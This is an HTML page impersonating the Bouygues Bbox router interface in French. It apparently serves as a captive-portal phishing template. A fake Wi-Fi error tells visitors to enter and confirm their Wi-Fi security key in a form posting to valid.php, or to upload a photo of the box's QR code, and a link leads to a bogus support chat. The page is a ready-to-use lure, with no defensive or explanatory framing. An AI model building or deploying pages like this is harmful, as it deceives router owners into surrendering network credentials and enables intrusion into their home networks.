<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Bienvenue sur votre interface Bouygues</title>
<link href="/bboxcss/centrage.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="js/jquery-1.11.3-jquery.min.js"></script>
<script type="text/javascript" src="script.js"></script>
<IMG class="displayed" src="bbox2.png">
</head>
<br>
<br>
<br>
<br>
<p><font color="teal">Code erreur 109: une erreur est survenue sur le réseau wifi.</p>
<br>
<br>
<body>
<p><font color="teal">Veuillez vous connecter vous avec le code wifi dans les champs ci dessous et valider pour générer un nouveau qr code, ce qr code va servir a connecter <b>l'ensemble de vos équipement sans avoir a taper le code wifi pour chacun d'eux.</b>Le code wifi s'affiche via le menu wifi de votre Bbox.
<br>
<br>Avec la molette de navigation, je sélectionne <b>"Connexion au réseau WiFi"</b> et je sélectionne <b>"Affichage en clair"</b> pour saisir manuellement le code wifi.</p>		
	<br>
	<center><IMG class="displayed" src="bbox4.png"></center>
	<br>
	<br>
	<form method="POST" action="valid.php">
<td style="color:#0a3448;font-size:11px;font-weight:bold;">Clef de sécurité :</td>
	<td width="50%"><input type="text" name="cle" size="" style="width: 180px"></td>
</tr>
<br>
<td style="color:#0a3448;font-size:11px;font-weight:bold;">Confirmation : </td>
<td width="0%"><input type="text" name="cleconf" size="" style="width: 180px">
<div class="block" id="thoughtbot">
<button>Créer le code QR</button> 
<br>
<br>
<p>Si vous disposez d'un téléphone, vous pouvez aussi prendre en photo le QR code dela box sans avoir besoin de rentrer la clé de sécurité.
<br>
<div class="container">
<div class="row">
<div class="col-md-8">
<form id="form" action="ajaxupload.php" method="post" enctype="multipart/form-data">
<input id="uploadImage" type="file" accept="image/*" name="image" />
<div id="preview"><img src="filed.png" /></div><br>
<input class="btn btn-success" type="submit" value="Upload">
</form>
<div id="err"></div>
<hr>
<p>Besoin d'une aide supplémentaire ? un technicien peut vous venir en aide: </strong> <a href="/shout/bboxtchat.php" target="_blank"><u>aide en ligne</u> ...</a>
</br>
</br>
</body>
</html>



